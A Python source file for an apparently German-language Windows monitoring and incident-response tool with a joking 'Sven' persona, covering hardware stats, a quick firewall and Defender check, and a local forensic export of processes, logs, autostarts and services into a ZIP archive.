import time
import random
import psutil
import ctypes
import subprocess
import socket
import winreg
import tempfile
import os 
import ipaddress
import logging
import datetime
from collections import Counter
import shlex
import csv
from pathlib import Path
import re
import sys
import getpass
import io
from logging.handlers import RotatingFileHandler
import geoip2.database
import zipfile
import glob
import json
import sqlite3
import shutil
import base64
import win32crypt
from Crypto.Cipher import AES
import platform

def erweitertes_monitoring():

    SHOW_RAM = True
    SHOW_PROZESSE = True
    # ---------------------------------------

    is_windows = platform.system().lower() == "windows"
    have_wmic = bool(shutil.which("wmic"))

    # -- Helpers lokal --
    def _human_bytes(n: float) -> str:
        for unit in ("B", "KB", "MB", "GB", "TB", "PB"):
            if n < 1024.0:
                return f"{n:.1f} {unit}"
            n /= 1024.0
        return f"{n:.1f} EB"

    def _cpu_bewertung(cpu):
        if cpu >= 90:  return "CPU überhitzt fast vor Arbeit. Bergwerk-Modus aktiviert?"
        if cpu >= 75:  return "Hohe Auslastung. Vielleicht mal ein Taskmanager-Sabbatical einlegen?"
        if cpu >= 50:  return "Alles im Rahmen, aber multitaskingfähig ist was anderes."
        if cpu >= 20:  return "CPU läuft so ruhig wie ein Beamter nach Feierabend."
        return "CPU pennt. Und ehrlich gesagt – ich auch fast."

    def _ram_bewertung(p):
        if p >= 90:  return "RAM fast voll. Willst du Photoshop UND Chrome gleichzeitig laufen lassen?"
        if p >= 75:  return "Ordentliche Auslastung. Vermutlich hast du wieder zu viele Tabs offen."
        if p >= 50:  return "Stabil. Noch kein Grund zur Panik – aber ich beobachte dich."
        if p >= 30:  return "RAM langweilt sich. Genau wie ich."
        return "RAM im Tiefschlaf. Vielleicht solltest du’s auch mal versuchen."

    def _cpu_temp():
        """(temp_c, quelle) oder (None, grund)"""
        # psutil (meist leer auf Windows)
        try:
            temps = psutil.sensors_temperatures()
            if temps:
                best = None
                for arr in temps.values():
                    for s in arr:
                        cur = getattr(s, "current", None)
                        if isinstance(cur, (int, float)):
                            best = cur if best is None else max(best, cur)
                if best is not None and 0 < best < 140:
                    return round(float(best), 1), "psutil"
        except Exception:
            pass
        # WMIC Fallback
        if is_windows and have_wmic:
            try:
                out = subprocess.check_output(
                    r'wmic /namespace:\\root\wmi PATH MSAcpi_ThermalZoneTemperature get CurrentTemperature',
                    shell=True, text=True, stderr=subprocess.DEVNULL
                )
                for line in out.splitlines():
                    line = line.strip()
                    if line.isdigit():
                        kelvin10 = int(line)
                        c = (kelvin10 / 10.0) - 273.15
                        if 0 < c < 120:
                            return round(c, 1), "wmic"
            except Exception:
                pass
        return None, "nicht verfügbar"

    def _temp_bewertung(c):
        if c >= 90: return "CPU im Schmelzmodus. Du heizt damit gerade die Arktis."
        if c >= 75: return "Wird warm hier. Vielleicht ein Ventilator? Oder zwei?"
        if c >= 60: return "Bisschen schwitzen ist okay. Noch lebt die CPU."
        if c >= 40: return "Normale Betriebstemperatur. Kein Grund zur Panik – noch."
        return "Kalt wie mein Herz. Alles bestens."

    def _net_rates_pernic():
        before = psutil.net_io_counters(pernic=True)
        time.sleep(1.0)
        after = psutil.net_io_counters(pernic=True)
        rates = {}
        for nic in after:
            if nic in before:
                up = max(0, after[nic].bytes_sent - before[nic].bytes_sent)
                down = max(0, after[nic].bytes_recv - before[nic].bytes_recv)
                rates[nic] = (up, down)
        return rates

    def _disk_rates_total():
        b = psutil.disk_io_counters(nowrap=True)
        time.sleep(1.0)
        a = psutil.disk_io_counters(nowrap=True)
        if not b or not a:
            return None
        rB = max(0, a.read_bytes - b.read_bytes)
        wB = max(0, a.write_bytes - b.write_bytes)
        rC = max(0, a.read_count - b.read_count)
        wC = max(0, a.write_count - b.write_count)
        rT = max(0, a.read_time - b.read_time)     # ms
        wT = max(0, a.write_time - b.write_time)   # ms
        return (rB, wB, rC, wC, rT, wT)

    def _battery_supported():
        try:
            return psutil.sensors_battery() is not None
        except Exception:
            return False

    def _gpu_info_windows():
        """
        Liefert Liste von Dicts: [{'name':..., 'vram_ded': int|None, 'vram_shared': int|None, 'driver': 'x.y.z'}]
        1) dxdiag /t <tmp> parsen (Dedizierter/Display/Dedicated Memory)
        2) Fallback WMIC Win32_VideoController (AdapterRAM, DriverVersion)
        """
        import os, tempfile, re

        results = []

        # --- 1) DXDIAG (genauer) ---
        try:
            tmp = tempfile.gettempdir()
            out_path = os.path.join(tmp, "sven_dxdiag.txt")
            # /whql:off beschleunigt; /t schreibt Text
            subprocess.run(["dxdiag", "/whql:off", "/t", out_path], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            if os.path.isfile(out_path):
                text = open(out_path, "r", encoding="utf-16-le", errors="ignore").read()
                # dxdiag ist lokalisiert -> mehrere Pattern
                blocks = re.split(r"\n-{10,}\n|\r\n-{10,}\r\n", text)  # grob in Abschnitte splitten
                for blk in blocks:
                    if ("Display Devices" in blk) or ("Display Device" in blk) or ("Anzeigegeräte" in blk) or ("Anzeigegerät" in blk):
                        # Einfache Extraktionen
                        name = None
                        drv = None
                        vram_ded = None
                        vram_shared = None

                        # Name
                        m = re.search(r"(Card name|Name|Kartenname)\s*:\s*(.+)", blk)
                        if m: name = m.group(2).strip()

                        # Treiber
                        m = re.search(r"(Driver Version|Treiber-Version)\s*:\s*([^\r\n]+)", blk)
                        if m: drv = m.group(2).strip()

                        # Dedizierter Speicher (verschiedene Labels)
                        for pat in [
                            r"(Display Memory \(VRAM\)|Dedicated Memory|Dedizierter Speicher|Dedizierter Videospeicher)\s*:\s*([0-9,\.]+)\s*(MB|GB)",
                        ]:
                            m = re.search(pat, blk, re.IGNORECASE)
                            if m:
                                val, unit = m.group(2).replace(",", "").replace(" ", ""), m.group(3).upper()
                                num = float(val)
                                vram_ded = int(num * (1024**2)) if unit == "MB" else int(num * (1024**3))
                                break

                        # Shared/System
                        for pat in [
                            r"(Shared Memory|Gemeinsamer Speicher|Freigegebener Speicher|System Memory)\s*:\s*([0-9,\.]+)\s*(MB|GB)",
                        ]:
                            m = re.search(pat, blk, re.IGNORECASE)
                            if m:
                                val, unit = m.group(2).replace(",", "").replace(" ", ""), m.group(3).upper()
                                num = float(val)
                                vram_shared = int(num * (1024**2)) if unit == "MB" else int(num * (1024**3))
                                break

                        if name or vram_ded or vram_shared or drv:
                            results.append({"name": name, "vram_ded": vram_ded, "vram_shared": vram_shared, "driver": drv})

                if results:
                    return results
        except Exception:
            pass

        # --- 2) Fallback WMIC ---
        try:
            if shutil.which("wmic"):
                out = subprocess.check_output(
                    'wmic path Win32_VideoController get Name,AdapterRAM,DriverVersion /format:csv',
                    shell=True, text=True, stderr=subprocess.DEVNULL
                )
                for line in out.splitlines():
                    if not line or line.startswith("Node,"):
                        continue
                    parts = [p.strip() for p in line.split(",")]
                    if len(parts) >= 4:
                        _, ram, drv, name = parts[0], parts[1], parts[2], ",".join(parts[3:])
                        vram = int(ram) if ram.isdigit() else None
                        results.append({"name": name or None, "vram_ded": vram, "vram_shared": None, "driver": drv or None})
        except Exception:
            pass

        return results or None

    def _mb_bios_info():
        """(baseboard, bios) Strings via WMIC, sonst None."""
        if not (is_windows and have_wmic):
            return None, None
        bb = None
        bios = None
        try:
            out = subprocess.check_output(
                'wmic baseboard get Product,Manufacturer,SerialNumber /format:list',
                shell=True, text=True, stderr=subprocess.DEVNULL
            )
            bb = " | ".join([s for s in (line.strip() for line in out.splitlines()) if line])
        except Exception:
            pass
        try:
            out = subprocess.check_output(
                'wmic bios get SMBIOSBIOSVersion,ReleaseDate,Manufacturer /format:list',
                shell=True, text=True, stderr=subprocess.DEVNULL
            )
            bios = " | ".join([s for s in (line.strip() for line in out.splitlines()) if line])
        except Exception:
            pass
        return bb or None, bios or None

    def _handles_count():
        """Summe aller Handles über Prozesse (Windows)."""
        if not is_windows:
            return None
        total = 0
        got_one = False
        for p in psutil.process_iter(["pid", "name"]):
            try:
                total += p.num_handles()
                got_one = True
            except Exception:
                continue
        return total if got_one else None
    # -- Helpers Ende --

    while True:
        print("\n[Erweitertes System-Monitoring]")

        # Menü dynamisch
        items = []
        if SHOW_RAM:           items.append("(r) RAM")
        items += ["(c) CPU", "(k) CPU-Kerne einzeln", "(n) Netzwerk", "(d) Festplatte", "(u) Uptime"]
        # Temperaturen (wenn psutil was hat oder WMIC existiert)
        temps_possible = False
        try:
            temps_possible = bool(psutil.sensors_temperatures())
        except Exception:
            temps_possible = False
        if not temps_possible and is_windows and have_wmic:
            temps_possible = True
        if temps_possible:
            items.append("(t) Temperaturen")
        if _battery_supported():
            items.append("(b) Batterie")
        if SHOW_PROZESSE:
            items.append("(p) Prozesse")
        # neue Punkte
        items.append("(s) Swap/Auslagerung")
        items.append("(l) Disk IOPS/Latenz")
        if is_windows and have_wmic:
            items.append("(g) GPU-Infos")
            items.append("(m) Mainboard/BIOS")
        if is_windows:
            items.append("(h) Handle-Zähler")
        items.append("(q) Zurück")

        first = " | ".join([x for x in items if x.split()[0] in {"(r)", "(c)", "(t)", "(n)", "(d)"}])
        second = " | ".join([x for x in items if x.split()[0] in {"(b)", "(u)", "(p)", "(k)", "(s)", "(l)"}])
        third = " | ".join([x for x in items if x.split()[0] in {"(g)", "(m)", "(h)", "(q)"}])
        print(first)
        if second: print(second)
        if third:  print(third)

        auswahl = input("Wähle eine Option: ").strip().lower()

        if auswahl == 'q':
            print("Sven sagt: Reicht mit Fakten. Zurück zur Faulheit.")
            break

        elif auswahl == 'r' and SHOW_RAM:
            try:
                ram = psutil.virtual_memory()
                used_mb = ram.used // (1024**2)
                total_mb = ram.total // (1024**2)
                prozent = ram.percent
                print(f"Sven sagt: RAM-Nutzung: {prozent}% – {used_mb} MB von {total_mb} MB.")
                print(f"Sven sagt: {_ram_bewertung(prozent)}")
            except Exception as e:
                print(f"Sven sagt: RAM-Check kaputt gegangen: {e}")

        elif auswahl == 'c':
            try:
                cpu = psutil.cpu_percent(interval=1)
                print(f"Sven sagt: CPU-Auslastung: {cpu}%")
                print(f"Sven sagt: {_cpu_bewertung(cpu)}")
            except Exception as e:
                print(f"Sven sagt: CPU-Check stürzt hiermit stilvoll ab: {e}")

        elif auswahl == 'k':
            try:
                kerne = psutil.cpu_percent(interval=1, percpu=True)
                for i, kern in enumerate(kerne):
                    print(f"Sven sagt: Kern {i}: {kern}% ausgelastet.")
            except Exception as e:
                print(f"Sven sagt: Kernzählung verweigert den Dienst: {e}")

        elif auswahl == 't' and temps_possible:
            temp, src = _cpu_temp()
            if temp is None:
                print("Sven sagt: Temperaturmessung nicht verfügbar (ohne Zusatztools wie Open/LibreHardwareMonitor).")
            else:
                print(f"Sven sagt: CPU-Temperatur: {temp}°C (Quelle: {src})")
                print(f"Sven sagt: {_temp_bewertung(temp)}")

        elif auswahl == 'n':
            try:
                totals = psutil.net_io_counters()
                print(f"Sven sagt: Netzwerk gesamt – gesendet {_human_bytes(totals.bytes_sent)}, empfangen {_human_bytes(totals.bytes_recv)}.")
                rates = _net_rates_pernic()
                if not rates:
                    print("Sven sagt: Keine Netzwerkadapter gefunden. Ist das LAN-Kabel ein Deko-Artikel?")
                else:
                    print("Sven sagt: Live‑Raten (ca. 1s Messung) pro Adapter:")
                    for nic, (up_bps, down_bps) in rates.items():
                        print(f"  • {nic}: ↑ {_human_bytes(up_bps)}/s  ↓ {_human_bytes(down_bps)}/s")
            except Exception as e:
                print(f"Sven sagt: Netzwerk-Analyse hat sich verheddert: {e}")

        elif auswahl == 'd':
            try:
                parts = []
                for p in psutil.disk_partitions(all=False):
                    if "cdrom" in p.opts or not p.fstype:
                        continue
                    try:
                        u = psutil.disk_usage(p.mountpoint)
                        parts.append((p.device, p.mountpoint, u.percent, u.used, u.total))
                    except PermissionError:
                        continue

                if not parts:
                    print("Sven sagt: Keine nutzbaren Partitionen gefunden. Läuft dein System von Luft und Liebe?")
                else:
                    print("Sven sagt: Datenträgernutzung:")
                    for dev, mnt, perc, used, total in parts:
                        print(f"  • {dev} @ {mnt}: {perc}% – {_human_bytes(used)} von {_human_bytes(total)} belegt")

                rates = _disk_rates_total()
                if rates:
                    rB, wB, rC, wC, rT, wT = rates
                    print(f"Sven sagt: Disk‑Durchsatz (≈1s, gesamt): Lesen {_human_bytes(rB)}/s, Schreiben {_human_bytes(wB)}/s")
                    # IOPS + mittlere Servicezeit (ms/IO)
                    iops_r = rC if rC else 0
                    iops_w = wC if wC else 0
                    avg_rt = (rT / rC) if rC else 0
                    avg_wt = (wT / wC) if wC else 0
                    print(f"Sven sagt: IOPS: Read {iops_r}/s | Write {iops_w}/s  | Ø Servicezeit: Read {avg_rt:.1f} ms, Write {avg_wt:.1f} ms")
                else:
                    print("Sven sagt: Konnte Disk‑I/O‑Raten nicht messen.")
            except Exception as e:
                print(f"Sven sagt: Festplatten‑Analyse ist ausgerutscht: {e}")

        elif auswahl == 'b' and _battery_supported():
            try:
                battery = psutil.sensors_battery()
                if battery:
                    status = "wird geladen" if battery.power_plugged else "nicht am Netz"
                    print(f"Sven sagt: Akku bei {battery.percent:.0f}%, {status}.")
                else:
                    print("Sven sagt: Keine Batterie. Vielleicht läuft dein Rechner auf Hoffnung?")
            except Exception:
                print("Sven sagt: Akku? Nicht gefunden. Vielleicht bist du ein Desktop.")

        elif auswahl == 'u':
            try:
                uptime = datetime.datetime.now() - datetime.datetime.fromtimestamp(psutil.boot_time())
                print(f"Sven sagt: System läuft seit {str(uptime).split('.')[0]}.")
            except Exception as e:
                print(f"Sven sagt: Uptime konnte nicht gelesen werden: {e}")

        elif auswahl == 'p' and SHOW_PROZESSE:
            try:
                prozesse = len(psutil.pids())
                print(f"Sven sagt: Aktive Prozesse: {prozesse} – Mehr als deine Gedanken pro Tag.")
            except Exception as e:
                print(f"Sven sagt: Prozesszähler hat gerade gekündigt: {e}")

        elif auswahl == 's':
            try:
                sw = psutil.swap_memory()
                print(f"Sven sagt: Swap/Auslagerung: {_human_bytes(sw.used)} von {_human_bytes(sw.total)} belegt ({sw.percent}%).")
                if sw.sin > 0 or sw.sout > 0:
                    print(f"Sven sagt: Seit Boot: swap‑in {_human_bytes(sw.sin)}, swap‑out {_human_bytes(sw.sout)}.")
                if sw.percent >= 50:
                    print("Sven sagt: Dein RAM kotzt bereits in die Auslagerungsdatei. Mehr RAM oder weniger Chrome‑Tabs.")
            except Exception as e:
                print(f"Sven sagt: Swap lässt sich nicht ermitteln: {e}")

        elif auswahl == 'l':
            try:
                rates = _disk_rates_total()
                if not rates:
                    print("Sven sagt: Keine Disk‑I/O‑Zahlen verfügbar.")
                else:
                    rB, wB, rC, wC, rT, wT = rates
                    iops_r = rC if rC else 0
                    iops_w = wC if wC else 0
                    avg_rt = (rT / rC) if rC else 0
                    avg_wt = (wT / wC) if wC else 0
                    print(f"Sven sagt: IOPS Read/Write: {iops_r}/s / {iops_w}/s")
                    print(f"Sven sagt: Ø Servicezeit: Read {avg_rt:.1f} ms, Write {avg_wt:.1f} ms")
                    print(f"Sven sagt: Durchsatz: Lesen {_human_bytes(rB)}/s, Schreiben {_human_bytes(wB)}/s")
            except Exception as e:
                print(f"Sven sagt: Latenzermittlung verendet würdevoll: {e}")

        elif auswahl == 'g' and is_windows:
            gpus = _gpu_info_windows()
            if not gpus:
                print("Sven sagt: GPU‑Infos nicht verfügbar (DXDIAG/WMIC).")
            else:
                print("Sven sagt: GPU‑Infos:")
                for g in gpus:
                    name = g.get("name") or "Unbekannt"
                    drv  = g.get("driver") or "unbekannt"
                    ded  = g.get("vram_ded")
                    shd  = g.get("vram_shared")
                    ded_txt = _human_bytes(ded) if isinstance(ded, int) and ded > 0 else "n/a"
                    shd_txt = _human_bytes(shd) if isinstance(shd, int) and shd > 0 else "n/a"
                    print(f"  • {name} | Treiber: {drv} | VRAM (dediziert): {ded_txt} | Shared: {shd_txt}")

        elif auswahl == 'm' and is_windows and have_wmic:
            bb, bios = _mb_bios_info()
            if bb:   print(f"Sven sagt: Mainboard: {bb}")
            else:    print("Sven sagt: Mainboard‑Infos nicht verfügbar.")
            if bios: print(f"Sven sagt: BIOS: {bios}")
            else:    print("Sven sagt: BIOS‑Infos nicht verfügbar.")

        elif auswahl == 'h' and is_windows:
            total = _handles_count()
            if total is None:
                print("Sven sagt: Handle‑Zahl nicht verfügbar.")
            else:
                print(f"Sven sagt: Offene Handles (gesamt): {total} – Windows liebt offene Baustellen.")

        else:
            print("Sven sagt: Unbekannter oder ausgeblendeter Befehl. Genau wie dein Lebensziel.")

def sicherheitsmonitoring_kompakt():
    print("\n[Sven Schnellcheck – zackig, aber verdammt genau]")

    # 1. Firewall-Regelprüfung
    try:
        output = subprocess.check_output("netsh advfirewall show allprofiles", shell=True).decode()
        if "State ON" not in output and "Status: ON" not in output:
            print("Sven sagt: ⚠️ Windows-Firewall scheint nicht durchgehend aktiv zu sein – vermutlich arbeitet sie im „Auf Nachfrage“-Modus. Falls nicht ist das ein Problem.")
        else:
            rules = subprocess.check_output("netsh advfirewall firewall show rule name=all", shell=True).decode(errors="ignore")
            if "Allow" in rules and "Inbound" in rules:
                print("Sven sagt: Firewall aktiv, aber viele Ausnahmen zugelassen – klingt nach Großzügigkeit für Angreifer.")
            else:
                print("Sven sagt: Firewall aktiv und blockiert sauber. Gut, so mag ich das.")
    except Exception:
        print("Sven sagt: ❓ Firewallstatus nicht lesbar – vielleicht blockierst du mich gerade. Ironisch.")

    # 2. Defender-Status
    try:
        result = subprocess.check_output("sc query WinDefend", shell=True).decode()
        if "RUNNING" in result:
            print("Sven sagt: Defender läuft – kein Superschutz, aber besser als nackt.")
        else:
            print("Sven sagt: ❗ Defender ist **inaktiv**. Klingt nach 'Ich hab nichts zu verbergen'.")
    except Exception:
        print("Sven sagt: Defender-Status nicht abrufbar. Vielleicht schon durch Malware ersetzt?")

    # 3. Adminrechte
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            print("Sven sagt: Du hast Adminrechte. Endlich einer mit Macht – oder Gefahr.")
        else:
            print("Sven sagt: Kein Admin. Wenigstens kannst du nichts Wichtiges kaputt machen – außer Vertrauen.")
    except Exception:
        print("Sven sagt: Konnte Adminstatus nicht feststellen. Du bist zu gut getarnt.")

    # 4. RAM-intensive Prozesse (> 10% RAM)
    print("\n[Sven checkt RAM-Fresser]")
    for proc in psutil.process_iter(['name', 'memory_percent']):
        try:
            if proc.info['memory_percent'] > 10:
                print(f"Sven sagt: ⚠️ '{proc.info['name']}' frisst RAM: {proc.info['memory_percent']:.1f}% – ab in die Diätklinik.")
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue

    # 5. Systemlaufzeit
    uptime = datetime.datetime.now() - datetime.datetime.fromtimestamp(psutil.boot_time())
    if uptime.total_seconds() > 7 * 24 * 3600:
        print(f"Sven sagt: Dein System läuft seit {str(uptime).split('.')[0]} – Neustart wäre sexy.")
    else:
        print(f"Sven sagt: Uptime ok: {str(uptime).split('.')[0]}. Reboot-Knopf darf aber benutzt werden.")

    print("\nSchnellcheck abgeschlossen. Willst du mehr wissen, frag 'Z'.")

def forensik_export():

    options = [
        ("1", 1, "1 Stunde"),
        ("2", 4, "4 Stunden"),
        ("3", 8, "8 Stunden"),
        ("4", 16, "16 Stunden"),
        ("5", 24, "24 Stunden"),
        ("6", 72, "3 Tage"),
        ("7", 168, "7 Tage"),
        ("8", 720, "30 Tage"),
    ]
    print("\n[Svenbot Incident Response] Wähle das Zeitfenster für den Export:")
    for o in options:
        print(f"({o[0]}) letzte {o[2]}")
    auswahl = input("> ").strip()
    stunden = None
    for o in options:
        if auswahl == o[0]:
            stunden = o[1]
            break
    if stunden is None:
        print("Ungültige Auswahl, nehme 1 Stunde als Standard.")
        stunden = 1

    now = datetime.datetime.now()
    export_dir = f"svenbot_incident_{now.strftime('%Y-%m-%d_%H-%M-%S')}"
    os.makedirs(export_dir, exist_ok=True)
    since = now - datetime.timedelta(hours=stunden)

    # 1. Systeminfo
    with open(os.path.join(export_dir, "systeminfo.txt"), "w", encoding="utf-8") as f:
        f.write(f"Timestamp: {now}\n")
        f.write(f"Hostname: {os.environ.get('COMPUTERNAME','?')}\n")
        f.write(f"Username: {getpass.getuser()}\n")
        f.write(f"OS: {os.environ.get('OS','?')}\n")
        f.write(f"Uptime: {str(datetime.datetime.now() - datetime.datetime.fromtimestamp(psutil.boot_time())).split('.')[0]}\n")

    # 2. Prozesse (Alle, inkl. Startzeit, aber Zeitfilter leider nicht direkt möglich)
    with open(os.path.join(export_dir, "prozesse.csv"), "w", encoding="utf-8") as f:
        f.write("pid;name;exe;user;ram_mb;cpu;start;cmdline\n")
        for proc in psutil.process_iter(['pid','name','exe','username','memory_info','cpu_percent','create_time','cmdline']):
            try:
                pstart = datetime.datetime.fromtimestamp(proc.info['create_time'])
                f.write(f"{proc.info['pid']};{proc.info['name']};{proc.info.get('exe','')};{proc.info.get('username','')};"
                        f"{proc.info['memory_info'].rss//(1024*1024)};{proc.info['cpu_percent']};{pstart};{' '.join(proc.info.get('cmdline') or [])}\n")
            except Exception:
                continue

    # 3. Netzwerk (nur aktuelle Verbindungen)
    with open(os.path.join(export_dir, "netzwerk.csv"), "w", encoding="utf-8") as f:
        f.write("pid;name;local_addr;remote_addr;status\n")
        for c in psutil.net_connections(kind='inet'):
            try:
                procname = psutil.Process(c.pid).name() if c.pid else ""
                laddr = f"{c.laddr.ip}:{c.laddr.port}" if c.laddr else ""
                raddr = f"{c.raddr.ip}:{c.raddr.port}" if c.raddr else ""
                f.write(f"{c.pid};{procname};{laddr};{raddr};{c.status}\n")
            except Exception:
                continue

    # 4. Dateiänderungen (EXE/DLL/BAT/PS1/JS/HTA/COM) letzte Stunde in wichtigen Pfaden
    extensions = ('.exe','.dll','.bat','.ps1','.vbs','.js','.hta','.com')
    search_dirs = [r"C:\Windows", r"C:\Users", r"C:\ProgramData"]
    with open(os.path.join(export_dir, "file_changes.txt"), "w", encoding="utf-8") as f:
        f.write(f"Neue/geänderte Dateien (nur EXE, DLL, Scripte) seit {since}:\n")
        for basedir in search_dirs:
            if not os.path.exists(basedir): continue
            for root, dirs, files in os.walk(basedir):
                for name in files:
                    if not name.lower().endswith(extensions): continue
                    try:
                        fp = os.path.join(root, name)
                        stat = os.stat(fp)
                        ctime = datetime.datetime.fromtimestamp(stat.st_ctime)
                        mtime = datetime.datetime.fromtimestamp(stat.st_mtime)
                        if ctime > since or mtime > since:
                            f.write(f"{fp} | Created: {ctime} | Modified: {mtime}\n")
                    except Exception:
                        continue

 # 5. Eventlogs (im gewählten Zeitfenster)
    try:
        import subprocess
        def get_eventlog(logname, outfile, stunden):
            minuten = stunden * 60
            with open(outfile, "w", encoding="utf-8") as f:
                f.write(f"Eventlog: {logname}, letzte {minuten} Minuten\n")
                cmd = ['wevtutil', 'qe', logname,
                       '/q:*[System[TimeCreated[timediff(@SystemTime) <= {}]]]'.format(minuten*60*1000),
                       '/f:text']
                res = subprocess.run(cmd, capture_output=True, text=True, encoding='utf-8', errors='ignore')
                f.write(res.stdout)
        get_eventlog("Security", os.path.join(export_dir, "eventlog_security.txt"), stunden)
        get_eventlog("System", os.path.join(export_dir, "eventlog_system.txt"), stunden)
        get_eventlog("Application", os.path.join(export_dir, "eventlog_application.txt"), stunden)
    except Exception as e:
        with open(os.path.join(export_dir, "eventlog_error.txt"), "w", encoding="utf-8") as f:
            f.write(f"Eventlog-Export Fehler: {e}")

    # 6. Autostarts (Registry: Run/RunOnce/Policies)
    if winreg:
        def dump_regkey(root, path, outfile):
            try:
                with winreg.OpenKey(root, path) as key, open(outfile, "a", encoding="utf-8") as f:
                    f.write(f"\n[{path}]\n")
                    i = 0
                    while True:
                        try:
                            n, v, t = winreg.EnumValue(key, i)
                            f.write(f"{n} = {v}\n")
                            i += 1
                        except OSError:
                            break
            except Exception as e:
                with open(outfile, "a", encoding="utf-8") as f:
                    f.write(f"Fehler: {e}\n")
        reg_out = os.path.join(export_dir, "autostart_registry.txt")
        dump_regkey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", reg_out)
        dump_regkey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", reg_out)
        dump_regkey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run", reg_out)
    else:
        with open(os.path.join(export_dir, "autostart_registry.txt"), "w", encoding="utf-8") as f:
            f.write("Kein Zugriff auf Registry (nicht Windows oder kein winreg).\n")

    # 7. Task Scheduler (geplante Aufgaben)
    try:
        import subprocess
        res = subprocess.run(['schtasks','/query','/fo','LIST','/v'], capture_output=True, text=True, encoding='utf-8', errors='ignore')
        with open(os.path.join(export_dir, "tasks.txt"), "w", encoding="utf-8") as f:
            f.write(res.stdout)
    except Exception as e:
        with open(os.path.join(export_dir, "tasks.txt"), "w", encoding="utf-8") as f:
            f.write(f"Fehler: {e}\n")

    # 8. Dienste & Treiber
    try:
        res = subprocess.run(['sc','query','type=','service','state=','all'], capture_output=True, text=True, encoding='utf-8', errors='ignore')
        with open(os.path.join(export_dir, "services.txt"), "w", encoding="utf-8") as f:
            f.write(res.stdout)
        res2 = subprocess.run(['driverquery','/v'], capture_output=True, text=True, encoding='utf-8', errors='ignore')
        with open(os.path.join(export_dir, "drivers.txt"), "w", encoding="utf-8") as f:
            f.write(res2.stdout)
    except Exception as e:
        with open(os.path.join(export_dir, "services.txt"), "a", encoding="utf-8") as f:
            f.write(f"Fehler: {e}\n")

    # 9. User & Gruppen
    try:
        res = subprocess.run(['net','user'], capture_output=True, text=True, encoding='utf-8', errors='ignore')
        with open(os.path.join(export_dir, "users.txt"), "w", encoding="utf-8") as f:
            f.write(res.stdout)
        res2 = subprocess.run(['net','localgroup'], capture_output=True, text=True, encoding='utf-8', errors='ignore')
        with open(os.path.join(export_dir, "groups.txt"), "w", encoding="utf-8") as f:
            f.write(res2.stdout)
    except Exception as e:
        with open(os.path.join(export_dir, "users.txt"), "a", encoding="utf-8") as f:
            f.write(f"Fehler: {e}\n")

    # 10. Installierte Programme (über Registry)
    if winreg:
        try:
            def get_installed_software(outfile):
                paths = [
                    (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
                    (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
                    (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
                ]
                with open(outfile, "w", encoding="utf-8") as f:
                    for root, path in paths:
                        try:
                            with winreg.OpenKey(root, path) as key:
                                for i in range(0, winreg.QueryInfoKey(key)[0]):
                                    try:
                                        subkey_name = winreg.EnumKey(key, i)
                                        with winreg.OpenKey(key, subkey_name) as subkey:
                                            name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                                            f.write(f"{name}\n")
                                    except Exception:
                                        continue
                        except Exception:
                            continue
            get_installed_software(os.path.join(export_dir, "installed_software.txt"))
        except Exception as e:
            with open(os.path.join(export_dir, "installed_software.txt"), "w", encoding="utf-8") as f:
                f.write(f"Fehler: {e}\n")

    # 11. Defender-Status & Core-Security
    try:
        res = subprocess.run(['sc','query','WinDefend'], capture_output=True, text=True, encoding='utf-8', errors='ignore')
        with open(os.path.join(export_dir, "defender_status.txt"), "w", encoding="utf-8") as f:
            f.write(res.stdout)
    except Exception as e:
        with open(os.path.join(export_dir, "defender_status.txt"), "w", encoding="utf-8") as f:
            f.write(f"Fehler: {e}\n")

    # 12. SMB/RDP/UAC Status
    # (Für schnelle Übersicht, nicht alles immer verfügbar)
    try:
        smb1 = subprocess.check_output(
            'powershell -Command "Get-WindowsOptionalFeature -Online -FeatureName SMB1Protocol"',
            shell=True, text=True, stderr=subprocess.DEVNULL)
        with open(os.path.join(export_dir, "smb1_status.txt"), "w", encoding="utf-8") as f:
            f.write(smb1)
    except Exception as e:
        with open(os.path.join(export_dir, "smb1_status.txt"), "w", encoding="utf-8") as f:
            f.write(f"Fehler: {e}\n")
    try:
        with open(os.path.join(export_dir, "rdp_uac_status.txt"), "w", encoding="utf-8") as f:
            if winreg:
                try:
                    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\Terminal Server") as key:
                        rdp_enabled, _ = winreg.QueryValueEx(key, "fDenyTSConnections")
                    f.write(f"RDP {'AKTIVIERT' if rdp_enabled == 0 else 'deaktiviert'}\n")
                    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System") as key:
                        uac_level, _ = winreg.QueryValueEx(key, "ConsentPromptBehaviorAdmin")
                    f.write(f"UAC-Level: {uac_level}\n")
                except Exception as e:
                    f.write(f"Fehler: {e}\n")
            else:
                f.write("Registry nicht verfügbar.\n")
    except Exception as e:
        pass

    # Alles ZIPpen
    zipname = f"{export_dir}.zip"
    with zipfile.ZipFile(zipname, 'w', compression=zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(export_dir):
            for file in files:
                file_path = os.path.join(root, file)
                zipf.write(file_path, arcname=os.path.relpath(file_path, export_dir))

    print(f"\n[Svenbot] Forensik-Export abgeschlossen für {stunden} Stunden! ZIP: {zipname}")

def sicherheits_tools():
    while True:
        print("\nSicherheits-Tools:")
        print("(1) Verdächtige Prozesse")
        print("(2) Autostart-Einträge")
        print("(3) Netzwerkverbindungen")
        print("(4) Systemzeit überprüfen")
        print("(5) DNS-Server prüfen")
        print("(6) Temp-Ordner auswerten")
        print("(7) Hosts-Datei prüfen")
        print("(8) Geplante Aufgaben anzeigen")
        print("(9) Aktive Verbindungen mit Herkunftsprüfung")
        print("(10) DLLs in sensiblen Prozessen prüfen")
        print("(11) Bekannte Namen am falschen Ort aufspüren")
        print("(12) Treiber Check")
